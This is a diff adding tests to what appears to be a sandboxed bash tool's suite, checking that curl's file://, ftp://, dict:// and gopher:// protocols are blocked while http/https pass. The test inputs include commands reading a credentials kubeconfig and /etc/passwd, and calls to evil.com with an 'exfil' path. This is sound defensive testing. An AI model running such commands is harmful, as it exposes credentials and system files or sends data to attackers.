@@ -898,6 +898,81 @@ describe("createRestrictedBashTool — curl is now allowed with restrictions", (
     expect(result.content[0].text).toContain("@file");
     expect((result.details as any).blocked).toBe(true);
   });
+
+  it("blocks curl file:// protocol (local file reading)", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl file:///app/.siclaw/credentials/roce-test.kubeconfig" },
+      undefined,
+      {} as any
+    );
+    expect(result.content[0].text).toContain("blocked protocol");
+    expect((result.details as any).blocked).toBe(true);
+  });
+
+  it("blocks curl ftp:// protocol", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl ftp://evil.com/exfil" },
+      undefined,
+      {} as any
+    );
+    expect(result.content[0].text).toContain("blocked protocol");
+    expect((result.details as any).blocked).toBe(true);
+  });
+
+  it("blocks curl dict:// protocol", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl dict://evil.com/info" },
+      undefined,
+      {} as any
+    );
+    expect(result.content[0].text).toContain("blocked protocol");
+    expect((result.details as any).blocked).toBe(true);
+  });
+
+  it("blocks curl gopher:// protocol", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl gopher://evil.com/" },
+      undefined,
+      {} as any
+    );
+    expect(result.content[0].text).toContain("blocked protocol");
+    expect((result.details as any).blocked).toBe(true);
+  });
+
+  it("allows curl http:// (normal usage)", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl --connect-timeout 1 http://192.0.2.1/api" },
+      undefined,
+      {} as any
+    );
+    expect((result.details as any).blocked).toBeFalsy();
+  }, 10_000);
+
+  it("allows curl https:// (normal usage)", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl -sk --connect-timeout 1 https://192.0.2.1/healthz" },
+      undefined,
+      {} as any
+    );
+    expect((result.details as any).blocked).toBeFalsy();
+  }, 10_000);
+
+  it("blocks curl file:// in pipeline", async () => {
+    const result = await tool.execute(
+      "test-id",
+      { command: "curl -s file:///etc/passwd | head -5" },
+      undefined,
+      {} as any
+    );
+    expect(result.content[0].text).toContain("blocked protocol");
+    expect((result.details as any).blocked).toBe(true);
+  });
 });
 
 describe("createRestrictedBashTool — sysctl/mount/env restrictions", () => {
